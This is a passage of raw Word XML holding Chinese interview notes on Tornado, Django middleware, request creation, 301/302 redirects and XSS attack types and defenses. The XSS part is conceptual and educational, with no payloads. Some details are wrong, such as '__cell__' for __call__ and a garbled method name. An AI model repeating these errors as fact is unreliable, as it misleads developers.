          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>。通过向</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>ioloop</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>中添加网络</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>I/O</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>事件，利用无阻塞的</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，再搭配相应的回调</w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00557AFE">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>函数，便可达到梦寐以求的高效异步执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E816795" w14:textId="0793DBA7" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说一下</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>MIDDLEWARES</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中间件的作用和应用场景？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="756FABD9" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#中间件是介于request与response处理之间的一道处理过程,用于在全局范围内改变Django的输入和输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58209340" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#简单的来说中间件是帮助我们在视图函数执行之前和执行之后都可以做一些额外的操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BDDBFB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#例如：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AD354E" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.Django项目中默认启用了csrf保护,每次请求时通过CSRF中间件检查请求中是否有正确#token值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E2B466" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.当用户在页面上发送请求时，通过自定义的认证中间件，判断用户是否已经登陆，未登陆就去登陆。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDB8D72" w14:textId="7E6357F1" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.当有用户请求过来时，判断用户是否在白名单或者在黑名单里</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DCE1DD6" w14:textId="7BD82037" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>中间件的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>个方法？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775B8942" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.process_request : 请求进来时,权限认证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DADA61C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.process_view : 路由匹配之后,能够得到视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CA40D5" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#3.process_exception : 异常时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F262237" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#4.process_template_responseprocess : 模板渲染时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC31188" w14:textId="06BEC6AA" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#5.process_response : 请求有响应时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F84542A" w14:textId="0E071521" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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lastRenderedPageBreak/>
        <w:t>012</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的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>对象是在什么时候创建的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029DAD39" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#class WSGIHandler(base.BaseHandler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760B0EA3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    request = self.request_class(environ)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505D6351" w14:textId="290F669B" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#请求走到WSGIHandler类的时候，执行__cell__方法，将environ封装成了request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142DA355" w14:textId="000D6530" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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013</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重定向是如何实现的？用的什么状态码？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DFA2A3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#1.使用HttpResponseRedirect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6F07E0" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#from django.http import HttpResponseRedirect  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418E1336" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#2.使用redirect和reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0283DB9B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#状态码：301和302</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178C8CBF" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#301和302的区别：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06004127" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#相同点：都表示重定向，浏览器在拿到服务器返回的这个状态码后会自动跳转到一个新的URL地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D01D67" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#不同点：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1504E704" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#301比较常用的场景是使用域名跳转。比如，我们访问 http://www.baidu.com 会跳转到 https://www.baidu.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781F3BD2" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#表示旧地址A的资源已经被永久地移除了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2B4D88" w14:textId="5F51B87B" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#302用来做临时跳转，比如未登陆的用户访问用户中心重定向到登录页面。表示旧地址A的资源还在（仍然可以访问），这个重定向只是临时地从旧地址A跳转到地址B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7D7BB3" w14:textId="2B971D2F" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="007161A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014</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>xxss</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>攻击</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FF48E8" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#-- XSS攻击是向网页中注入恶意脚本，用在用户浏览网页时，在用户浏览器中执行恶意脚本的攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309CE60A" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    -- XSS分类，反射型xss ，存储型xss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E31EDD8" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    -- 反射型xss又称为非持久型xss，攻击者通过电子邮件等方式将包含注入脚本的链接发送给受害者，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7E33A3" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#        受害者通过点击链接，执行注入脚本，达到攻击目的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008FC897" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    -- 持久型xss跟反射型的最大不同是攻击脚本将被永久的存放在目标服务器的数据库和文件中，多见于论坛</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270EEA33" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#        攻击脚本连同正常信息一同注入到帖子内容当中，当浏览这个被注入恶意脚本的帖子的时候，恶意脚本会被执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023B79DA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    -- 防范措施 1 输入过滤  2 输出编码  3 cookie防盗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBE5E93" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#        1，输入过滤 用户输入进行检测 不允许带有js代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283EFC58" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#        2，输出编码 就是把我们的脚本代码变成字符串形式输出出来</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136380FB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#        3，cookie加密</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE6C85A" w14:textId="6345FB3B" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA0E4FB" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#向页面注入恶意的代码,这些代码被浏览器执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="237D6B8B" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#XSS攻击能做些什么：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D937EBA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.窃取cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E716722" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8E5AB8" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
